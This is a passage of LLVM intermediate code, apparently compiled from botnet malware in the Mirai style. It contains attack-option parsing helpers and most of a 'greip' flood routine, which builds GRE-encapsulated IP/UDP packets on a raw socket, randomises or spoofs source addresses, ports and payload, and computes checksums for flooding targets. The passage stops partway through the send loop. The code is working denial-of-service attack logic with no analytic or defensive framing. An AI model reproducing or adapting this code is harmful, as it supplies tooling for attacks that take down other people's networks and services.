  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

11:                                               ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %38

16:                                               ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

27:                                               ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %40

34:                                               ; preds = %16
  br label %35

35:                                               ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %11, !llvm.loop !12

38:                                               ; preds = %11
  %39 = load i8*, i8** %9, align 8
  store i8* %39, i8** %5, align 8
  br label %40

40:                                               ; preds = %38, %27
  %41 = load i8*, i8** %5, align 8
  ret i8* %41
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @attack_get_opt_int(i8 noundef zeroext %0, %struct.attack_option* noundef %1, i8 noundef zeroext %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 noundef zeroext %11, %struct.attack_option* noundef %12, i8 noundef zeroext %13, i8* noundef null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

17:                                               ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

19:                                               ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* noundef %20, i32 noundef 10)
  store i32 %21, i32* %5, align 4
  br label %22

22:                                               ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @attack_get_opt_ip(i8 noundef zeroext %0, %struct.attack_option* noundef %1, i8 noundef zeroext %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 noundef zeroext %11, %struct.attack_option* noundef %12, i8 noundef zeroext %13, i8* noundef null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

17:                                               ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

19:                                               ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* noundef %20) #7
  store i32 %21, i32* %5, align 4
  br label %22

22:                                               ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_greip(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 noundef %34, i64 noundef 8) #7
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 noundef zeroext %37, %struct.attack_option* noundef %38, i8 noundef zeroext 2, i32 noundef 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 noundef zeroext %41, %struct.attack_option* noundef %42, i8 noundef zeroext 3, i32 noundef 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 noundef zeroext %45, %struct.attack_option* noundef %46, i8 noundef zeroext 4, i32 noundef 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 noundef zeroext %49, %struct.attack_option* noundef %50, i8 noundef zeroext 5, i32 noundef 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 noundef zeroext %53, %struct.attack_option* noundef %54, i8 noundef zeroext 6, i32 noundef 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 noundef zeroext %57, %struct.attack_option* noundef %58, i8 noundef zeroext 7, i32 noundef 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 noundef zeroext %61, %struct.attack_option* noundef %62, i8 noundef zeroext 0, i32 noundef 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 noundef zeroext %64, %struct.attack_option* noundef %65, i8 noundef zeroext 1, i32 noundef 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 noundef zeroext %68, %struct.attack_option* noundef %69, i8 noundef zeroext 19, i32 noundef 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 noundef zeroext %72, %struct.attack_option* noundef %73, i8 noundef zeroext 25, i32 noundef %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #7
  store i32 %76, i32* %10, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

78:                                               ; preds = %4
  br label %433

79:                                               ; preds = %4
  store i32 1, i32* %9, align 4
  %80 = load i32, i32* %10, align 4
  %81 = bitcast i32* %9 to i8*
  %82 = call i32 @setsockopt(i32 noundef %80, i32 noundef 0, i32 noundef 3, i8* noundef %81, i32 noundef 4) #7
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %87

84:                                               ; preds = %79
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @close(i32 noundef %85)
  br label %433

87:                                               ; preds = %79
  store i32 0, i32* %9, align 4
  br label %88

88:                                               ; preds = %238, %87
  %89 = load i32, i32* %9, align 4
  %90 = load i8, i8* %5, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp slt i32 %89, %91
  br i1 %92, label %93, label %241

93:                                               ; preds = %88
  %94 = call noalias i8* @calloc(i64 noundef 1510, i64 noundef 8) #7
  %95 = load i8**, i8*** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8*, i8** %95, i64 %97
  store i8* %94, i8** %98, align 8
  %99 = load i8**, i8*** %11, align 8
  %100 = load i32, i32* %9, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8*, i8** %99, i64 %101
  %103 = load i8*, i8** %102, align 8
  %104 = bitcast i8* %103 to %struct.iphdr*
  store %struct.iphdr* %104, %struct.iphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i64 1
  %107 = bitcast %struct.iphdr* %106 to %struct.grehdr*
  store %struct.grehdr* %107, %struct.grehdr** %23, align 8
  %108 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %109 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %108, i64 1
  %110 = bitcast %struct.grehdr* %109 to %struct.iphdr*
  store %struct.iphdr* %110, %struct.iphdr** %24, align 8
  %111 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %112 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %111, i64 1
  %113 = bitcast %struct.iphdr* %112 to %struct.udphdr*
  store %struct.udphdr* %113, %struct.udphdr** %25, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = and i8 %116, 15
  %118 = or i8 %117, 64
  store i8 %118, i8* %115, align 4
  %119 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %120 = bitcast %struct.iphdr* %119 to i8*
  %121 = load i8, i8* %120, align 4
  %122 = and i8 %121, -16
  %123 = or i8 %122, 5
  store i8 %123, i8* %120, align 4
  %124 = load i8, i8* %12, align 1
  %125 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i32 0, i32 1
  store i8 %124, i8* %126, align 1
  %127 = load i32, i32* %18, align 4
  %128 = sext i32 %127 to i64
  %129 = add i64 52, %128
  %130 = trunc i64 %129 to i16
  %131 = call zeroext i16 @htons(i16 noundef zeroext %130) #8
  %132 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %133 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %132, i32 0, i32 2
  store i16 %131, i16* %133, align 2
  %134 = load i16, i16* %13, align 2
  %135 = call zeroext i16 @htons(i16 noundef zeroext %134) #8
  %136 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 3
  store i16 %135, i16* %137, align 4
  %138 = load i8, i8* %14, align 1
  %139 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 5
  store i8 %138, i8* %140, align 4
  %141 = load i8, i8* %15, align 1
  %142 = icmp ne i8 %141, 0
  br i1 %142, label %143, label %147

143:                                              ; preds = %93
  %144 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %145 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 4
  store i16 %144, i16* %146, align 2
  br label %147

147:                                              ; preds = %143, %93
  %148 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 6
  store i8 47, i8* %149, align 1
  %150 = load i32, i32* %21, align 4
  %151 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 8
  store i32 %150, i32* %152, align 4
  %153 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %154 = load i32, i32* %9, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %153, i64 %155
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %156, i32 0, i32 1
  %158 = load i32, i32* %157, align 4
  %159 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 9
  store i32 %158, i32* %160, align 4
  %161 = call zeroext i16 @htons(i16 noundef zeroext 2048) #8
  %162 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %163 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %162, i32 0, i32 1
  store i16 %161, i16* %163, align 2
  %164 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %165 = bitcast %struct.iphdr* %164 to i8*
  %166 = load i8, i8* %165, align 4
  %167 = and i8 %166, 15
  %168 = or i8 %167, 64
  store i8 %168, i8* %165, align 4
  %169 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %170 = bitcast %struct.iphdr* %169 to i8*
  %171 = load i8, i8* %170, align 4
  %172 = and i8 %171, -16
  %173 = or i8 %172, 5
  store i8 %173, i8* %170, align 4
  %174 = load i8, i8* %12, align 1
  %175 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 1
  store i8 %174, i8* %176, align 1
  %177 = load i32, i32* %18, align 4
  %178 = sext i32 %177 to i64
  %179 = add i64 28, %178
  %180 = trunc i64 %179 to i16
  %181 = call zeroext i16 @htons(i16 noundef zeroext %180) #8
  %182 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 2
  store i16 %181, i16* %183, align 2
  %184 = load i16, i16* %13, align 2
  %185 = zext i16 %184 to i32
  %186 = xor i32 %185, -1
  %187 = trunc i32 %186 to i16
  %188 = call zeroext i16 @htons(i16 noundef zeroext %187) #8
  %189 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 3
  store i16 %188, i16* %190, align 4
  %191 = load i8, i8* %14, align 1
  %192 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 5
  store i8 %191, i8* %193, align 4
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  br i1 %195, label %196, label %200

196:                                              ; preds = %147
  %197 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %198 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 4
  store i16 %197, i16* %199, align 2
  br label %200

200:                                              ; preds = %196, %147
  %201 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 6
  store i8 17, i8* %202, align 1
  %203 = call i32 @rand_next()
  %204 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 8
  store i32 %203, i32* %205, align 4
  %206 = load i8, i8* %20, align 1
  %207 = icmp ne i8 %206, 0
  br i1 %207, label %208, label %214

208:                                              ; preds = %200
  %209 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 9
  %211 = load i32, i32* %210, align 4
  %212 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 9
  store i32 %211, i32* %213, align 4
  br label %222

214:                                              ; preds = %200
  %215 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 8
  %217 = load i32, i32* %216, align 4
  %218 = sub i32 %217, 1024
  %219 = xor i32 %218, -1
  %220 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 9
  store i32 %219, i32* %221, align 4
  br label %222

222:                                              ; preds = %214, %208
  %223 = load i16, i16* %16, align 2
  %224 = call zeroext i16 @htons(i16 noundef zeroext %223) #8
  %225 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %226 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %225, i32 0, i32 0
  store i16 %224, i16* %226, align 2
  %227 = load i16, i16* %17, align 2
  %228 = call zeroext i16 @htons(i16 noundef zeroext %227) #8
  %229 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %230 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %229, i32 0, i32 1
  store i16 %228, i16* %230, align 2
  %231 = load i32, i32* %18, align 4
  %232 = sext i32 %231 to i64
  %233 = add i64 8, %232
  %234 = trunc i64 %233 to i16
  %235 = call zeroext i16 @htons(i16 noundef zeroext %234) #8
  %236 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %237 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %236, i32 0, i32 2
  store i16 %235, i16* %237, align 2
  br label %238

238:                                              ; preds = %222
  %239 = load i32, i32* %9, align 4
  %240 = add nsw i32 %239, 1
  store i32 %240, i32* %9, align 4
  br label %88, !llvm.loop !13

241:                                              ; preds = %88
  br label %242

242:                                              ; preds = %432, %241
  store i32 0, i32* %9, align 4
  br label %243

243:                                              ; preds = %429, %242
  %244 = load i32, i32* %9, align 4
  %245 = load i8, i8* %5, align 1
  %246 = zext i8 %245 to i32
  %247 = icmp slt i32 %244, %246
  br i1 %247, label %248, label %432

248:                                              ; preds = %243
  %249 = load i8**, i8*** %11, align 8
  %250 = load i32, i32* %9, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds i8*, i8** %249, i64 %251
  %253 = load i8*, i8** %252, align 8
  store i8* %253, i8** %26, align 8
  %254 = load i8*, i8** %26, align 8
  %255 = bitcast i8* %254 to %struct.iphdr*
  store %struct.iphdr* %255, %struct.iphdr** %27, align 8
  %256 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %257 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %256, i64 1
  %258 = bitcast %struct.iphdr* %257 to %struct.grehdr*
  store %struct.grehdr* %258, %struct.grehdr** %28, align 8
  %259 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %260 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %259, i64 1
  %261 = bitcast %struct.grehdr* %260 to %struct.iphdr*
  store %struct.iphdr* %261, %struct.iphdr** %29, align 8
  %262 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i64 1
  %264 = bitcast %struct.iphdr* %263 to %struct.udphdr*
  store %struct.udphdr* %264, %struct.udphdr** %30, align 8
  %265 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %266 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %265, i64 1
  %267 = bitcast %struct.udphdr* %266 to i8*
  store i8* %267, i8** %31, align 8
  %268 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %269 = load i32, i32* %9, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %268, i64 %270
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %271, i32 0, i32 2
  %273 = load i8, i8* %272, align 4
  %274 = zext i8 %273 to i32
  %275 = icmp slt i32 %274, 32
  br i1 %275, label %276, label %297

276:                                              ; preds = %248
  %277 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %278 = load i32, i32* %9, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %277, i64 %279
  %281 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %280, i32 0, i32 1
  %282 = load i32, i32* %281, align 4
  %283 = call i32 @ntohl(i32 noundef %282) #8
  %284 = call i32 @rand_next()
  %285 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 2
  %290 = load i8, i8* %289, align 4
  %291 = zext i8 %290 to i32
  %292 = lshr i32 %284, %291
  %293 = add i32 %283, %292
  %294 = call i32 @htonl(i32 noundef %293) #8
  %295 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 9
  store i32 %294, i32* %296, align 4
  br label %297

297:                                              ; preds = %276, %248
  %298 = load i32, i32* %21, align 4
  %299 = icmp eq i32 %298, -1
  br i1 %299, label %300, label %304

300:                                              ; preds = %297
  %301 = call i32 @rand_next()
  %302 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %303 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %302, i32 0, i32 8
  store i32 %301, i32* %303, align 4
  br label %304

304:                                              ; preds = %300, %297
  %305 = load i16, i16* %13, align 2
  %306 = zext i16 %305 to i32
  %307 = icmp eq i32 %306, 65535
  br i1 %307, label %308, label %323

308:                                              ; preds = %304
  %309 = call i32 @rand_next()
  %310 = and i32 %309, 65535
  %311 = trunc i32 %310 to i16
  %312 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %313 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %312, i32 0, i32 3
  store i16 %311, i16* %313, align 4
  %314 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %315 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %314, i32 0, i32 3
  %316 = load i16, i16* %315, align 4
  %317 = zext i16 %316 to i32
  %318 = sub nsw i32 %317, 1000
  %319 = xor i32 %318, -1
  %320 = trunc i32 %319 to i16
  %321 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %322 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %321, i32 0, i32 3
  store i16 %320, i16* %322, align 4
  br label %323

323:                                              ; preds = %308, %304
  %324 = load i16, i16* %16, align 2
  %325 = zext i16 %324 to i32
  %326 = icmp eq i32 %325, 65535
  br i1 %326, label %327, label %333

327:                                              ; preds = %323
  %328 = call i32 @rand_next()
  %329 = and i32 %328, 65535
  %330 = trunc i32 %329 to i16
  %331 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %332 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %331, i32 0, i32 0
  store i16 %330, i16* %332, align 2
  br label %333

333:                                              ; preds = %327, %323
  %334 = load i16, i16* %17, align 2
  %335 = zext i16 %334 to i32
  %336 = icmp eq i32 %335, 65535
  br i1 %336, label %337, label %343

337:                                              ; preds = %333
  %338 = call i32 @rand_next()
  %339 = and i32 %338, 65535
  %340 = trunc i32 %339 to i16
  %341 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %342 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %341, i32 0, i32 1
  store i16 %340, i16* %342, align 2
  br label %343

343:                                              ; preds = %337, %333
  %344 = load i8, i8* %20, align 1
  %345 = icmp ne i8 %344, 0
  br i1 %345, label %350, label %346

346:                                              ; preds = %343
  %347 = call i32 @rand_next()
  %348 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %349 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %348, i32 0, i32 9
  store i32 %347, i32* %349, align 4
  br label %356

350:                                              ; preds = %343
  %351 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %352 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %351, i32 0, i32 9
  %353 = load i32, i32* %352, align 4
  %354 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %355 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %354, i32 0, i32 9
  store i32 %353, i32* %355, align 4
  br label %356

356:                                              ; preds = %350, %346
  %357 = load i8, i8* %19, align 1
  %358 = icmp ne i8 %357, 0
  br i1 %358, label %359, label %362

359:                                              ; preds = %356
  %360 = load i8*, i8** %31, align 8
  %361 = load i32, i32* %18, align 4
  call void @rand_str(i8* noundef %360, i32 noundef %361)
  br label %362

362:                                              ; preds = %359, %356
  %363 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i32 0, i32 7
  store i16 0, i16* %364, align 2
  %365 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %366 = bitcast %struct.iphdr* %365 to i16*
  %367 = call zeroext i16 @checksum_generic(i16* noundef %366, i32 noundef 20)
  %368 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %369 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %368, i32 0, i32 7
  store i16 %367, i16* %369, align 2
  %370 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %371 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %370, i32 0, i32 7
  store i16 0, i16* %371, align 2
  %372 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %373 = bitcast %struct.iphdr* %372 to i16*
  %374 = call zeroext i16 @checksum_generic(i16* noundef %373, i32 noundef 20)
  %375 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %376 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %375, i32 0, i32 7
  store i16 %374, i16* %376, align 2
  %377 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %378 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %377, i32 0, i32 3
  store i16 0, i16* %378, align 2
  %379 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %380 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %381 = bitcast %struct.udphdr* %380 to i8*
  %382 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %383 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %382, i32 0, i32 2
  %384 = load i16, i16* %383, align 2
  %385 = load i32, i32* %18, align 4
  %386 = sext i32 %385 to i64
  %387 = add i64 8, %386
  %388 = trunc i64 %387 to i32
  %389 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %379, i8* noundef %381, i16 noundef zeroext %384, i32 noundef %388)
  %390 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %391 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %390, i32 0, i32 3
  store i16 %389, i16* %391, align 2
  %392 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %393 = load i32, i32* %9, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %392, i64 %394
  %396 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %395, i32 0, i32 0
  %397 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %396, i32 0, i32 0
  store i16 2, i16* %397, align 4
  %398 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %399 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %398, i32 0, i32 9
  %400 = load i32, i32* %399, align 4
  %401 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %402 = load i32, i32* %9, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %401, i64 %403
